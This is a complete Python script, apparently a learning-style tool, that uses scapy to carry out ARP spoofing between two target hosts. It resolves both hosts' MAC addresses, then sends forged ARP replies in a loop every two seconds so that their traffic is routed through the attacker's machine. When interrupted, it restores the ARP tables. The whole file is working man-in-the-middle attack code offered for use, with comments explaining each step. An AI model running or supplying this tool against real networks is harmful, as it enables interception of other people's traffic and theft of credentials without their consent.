#!/usr/bin/env python3

import scapy.all as scapy
import time
import argparse

# Function to get the IP address from the user from the terminal.
def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t1", "--target1", required=True, dest="targetIP1", help="Sets the IP address of the machine(1) for which we want to intercept the traffic")
    parser.add_argument("-t2", "--target2", required=True, dest="targetIP2", help="Sets the IP address of the machine(2) for which we want to intercept the traffic")
    options = parser.parse_args()
    return options

#Function to get the MAC address of the targets.
def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip) #sends the arp request
    broadCast_request = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") #sends the broadcast request
    arp_broadCast_request = broadCast_request/arp_request #boradcasts the ARP request
    target_mac = scapy.srp(arp_broadCast_request, timeout=1, verbose=False)[0] #captures the response in the "target_mac" list variable [0] ---> since two lists are returned as response from scapy.srp.
    return target_mac[0][1].hwsrc #target_mac list's 0 index which has two list of response in which we access index 1 with the value of hwsrc which is the mac of our target.

# Function to spoof the IP address.
def arp_spoof(targetIP,spoofIP):
    target_mac = get_mac(targetIP)
    packet = scapy.ARP(op=2, pdst=targetIP, hwdst=target_mac, psrc=spoofIP) # stores the ARP packet in the variable with packet source spoofed with the attackers MAC
    scapy.send(packet, verbose=False) # sends the packet to the target

# Function to restore the ARP Table when program gets terminated.
def restore_table(destinationIP,sourceIP):
    target_mac = get_mac(destinationIP)
    source_mac = get_mac(sourceIP)
    packet = scapy.ARP(op=2, pdst=destinationIP, hwdst=target_mac, psrc=sourceIP, hwsrc=source_mac) # restores the ARP table by sending the packet with the source MAC as of the genuine host's MAC
    scapy.send(packet, verbose= False) # sends the packet.


try:
    options = get_arguments()
    packet_count = 0
    while True:
        arp_spoof(options.targetIP1, options.targetIP2)
        arp_spoof(options.targetIP2, options.targetIP1)
        packet_count = packet_count + 2
        print("\r[+] No.of.packet sent ---> " + str(packet_count), end="")
        time.sleep(2)
# restores the ARP table on keyboard interuption
except KeyboardInterrupt:
    print("\n[+] Terminated the program due to user intervention")
    restore_table(options.targetIP1, options.targetIP2)
    restore_table(options.targetIP2, options.targetIP1)
    print("[+] ARP table has been successfully restored!!!")


